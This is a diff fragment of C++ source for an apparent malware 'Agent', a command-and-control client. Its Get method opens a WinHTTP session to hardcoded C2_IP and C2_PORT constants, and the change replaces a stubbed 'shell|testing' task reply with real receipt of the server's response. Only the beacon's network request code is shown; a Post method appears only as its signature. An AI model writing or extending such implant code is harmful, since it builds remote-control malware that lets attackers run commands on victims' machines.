@@ -27,24 +27,29 @@ std::string Agent::Get(std::wstring path) {
 	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	
 	if (!hSession) {
-		return "";
+		return result;
 	}
 
 	hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
 
 	if (!hConnect) {
-		return "";
+		return result;
 	}
 
 	hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
 
 	if (!hRequest) {
-		return "";
+		return result;
 	}
 
 	bResults = WinHttpSendRequest(hRequest,	WINHTTP_NO_ADDITIONAL_HEADERS,	0, WINHTTP_NO_REQUEST_DATA, 0,	0, 0);
 
-	return "shell|testing";
+	if (bResults)
+		bResults = WinHttpReceiveResponse(hRequest, NULL);
+	
+
+
+	return result;
 }
 
 std::string Agent::Post(std::string path, std::string data) {
